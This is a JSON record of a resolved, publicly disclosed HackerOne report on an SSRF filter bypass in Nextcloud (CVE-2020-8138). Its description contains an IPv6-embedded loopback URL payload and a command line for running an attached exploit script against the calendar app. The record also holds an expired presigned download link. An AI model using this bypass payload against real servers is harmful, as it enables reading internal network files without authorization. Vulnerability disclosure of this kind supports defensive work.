@@ -1,0 +1,148 @@
+{
+  "id": 736867,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzY4Njc=",
+  "url": "https://hackerone.com/reports/736867",
+  "title": "SSRF protection bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-13T14:07:57.214Z",
+  "submitted_at": "2019-11-13T14:07:57.214Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "foobar7",
+    "url": "/foobar7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8138"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-03-14T10:10:57.211Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-02-13T10:10:56.031Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "CVSS\n----\n\nHigh 7.7 [CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)\n\n\nDescription\n-----------\n\nThe filter which protects Nextcloud from SSRF can be bypassed using IPv6/IPv4 address embedding.\n\nSSRF protection is for example used in the calendar or dav apps. Successful exploitation of the issue will allow reading of files in the local network with the authorization of the server hosting Nextcloud.\n\nPOC\n---\n\nThe following example can be used to bypass the SSRF filter, where `127.0.0.1` is the server hosting the file:\n\n    http://[0:0:0:0:0:ffff:127.0.0.1]/thefile\n\nThe issue can for example be exploited in the calendar app with the attached exploit. Usage:\n\n    python nextcloud_ssrf.py http://192.168.0.105/nextcloud/nextcloud/ admin \"[password]\" http://[0:0:0:0:0:ffff:127.0.0.1]:80/secret.ics\n    BEGIN:VCALENDAR\n    VERSION:2.0\n    PRODID:-//hacksw/handcal//NONSGML v1.0//EN\n    BEGIN:VEVENT\n    UID:uid1@example.com\n    DTSTAMP:19970714T170000Z\n    ORGANIZER;CN=John Doex:MAILTO:john.doe@example.com\n    DTSTART:19970714T170000Z\n    DTEND:19970715T035959Z\n    SUMMARY:Bastille Day Party\n    GEO:48.85299;2.36885\n    END:VEVENT\n    END:VCALENDAR\n\n## Impact\n\nexfiltrate data from the internal network and perform actions in the name of the server in the internal network",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 633323,
+      "file_name": "nextcloud_ssrf.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/srpeWfQYz5LMrNA1QG93X4Mq?response-content-disposition=attachment%3B%20filename%3D%22nextcloud_ssrf.py%22%3B%20filename%2A%3DUTF-8%27%27nextcloud_ssrf.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXNIIX3M5%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T004518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDldff%2BegSqnidvDXXtea1pJxbaRsptNz6zyLZl2owcswIhAK1JCOXh3N7GYQHibfagtnVMvy2atTmK0Il3112rvBRRKroFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igwdl0NV3%2BNqOJMMEfEqjgWlDqjww5ddHOtMbSE98z5NzcEYroXLBDK28O1STJBJvf6%2FfUJiJ%2BbeJq1zErz1UnlNkfuLKY57RU3pflsLqp336RoeNkC1e6ZNqZgvxupI0WcPY1V0khFKxcoiwf3IynN%2Bj0eY1su%2BVMTPPDfTaru6Fzq6aCE1vXWuPFAgNRJ7wmLNpkIzRiv9fl7VwtU4yte2la3UjYDhcDJM%2Bn2jQIyzYBCJ1%2FbZtEFAYNTOnk30r1mEPnomDjhfGFiyE26SfXjxTdHeWplSwIBRSpzsleAp4tY8C1EtvykzPmIH9HocbAIYt6difoxJbx50dEXaYbYUfBxxqjtWzyUrpPCm2kTLkUFW9XHL2iW4sd9jlpfk%2FoR257men%2BqYamBOQvZqt9QOSg0vXAcUA0VPBYbaHjTo9dWphA7e5U4zeeuaUJ%2BXD3dzyQZavrZobBs1u%2BIN%2FZkUY72fo0wqCvYJCQVrzFaNdcotjjqRzI54GRfQzKR9hvE4%2B7oT9MJpg26jO9nsC89ybGcNiHtUIAvlWWAckYRFhM5oYgPNnLnxjW4bfE6FanCoC4heZIC0qmMQmqqHZ4CSBAJXVrxuWKE9vW3HUN3DSpvvtNSfi%2B1VkQ0ukMFKUyFgbL6Og8%2B69Fgcl1OrFcha1CgG8IttkoK7xMzkgGfTzRRt7rV5uJKPo7HTiIcYyRex%2Fv6PThdz8mtjKlZ8OYe3OhV%2BGTwlSC3VxiTJxhuPC2qEwaen4dFXV%2FlxdZrBR3QhkwqD08WUcxQHgwYLDAQR31kpM6J5XbZCvdaLapm460DC2GsCOocUKv9Yh96yB9wBSR%2F4kybUtQXCkrKvqDMG6JnPUWROpGqPU9wX0RtT9vtWVL7et1ozKxyHaNkw0u7jzAY6sAEW9qo1bNkFXEoi5HNjA5fdNplC29dIqPG9utkLBN4yCZMwP111mCQeRNBVBEpjhN21OasHu7QwHkJuJ1w34t7yP76SJjkTrK2MsM1yVA3tF5BTStnzafPBjEUQ5SU1HoLrnO%2B7K1SyF3empayGhwSnMHOFe%2BmGe46CdStkg1yOJEYUGe48k4qVT1ph0d%2BJGSyUvePUObpvQWGb%2B3ODd%2F2dfJTEVoq5hWczZRPHMtd1aQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5417a0fd82b1dc34ed6817597e5f61a44e19a5182703aa67dfd78ab2364d0454",
+      "file_size": 1563,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-03-14T10:10:56.087Z",
+  "allow_singular_disclosure_after": -187454062.67426306,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "sebd",
+    "a_d_a_m",
+    "thaivu",
+    "ali",
+    "mik317",
+    "ms1241721_",
+    "alb3r7",
+    "cryptographer",
+    "zimmer75",
+    "omespino",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
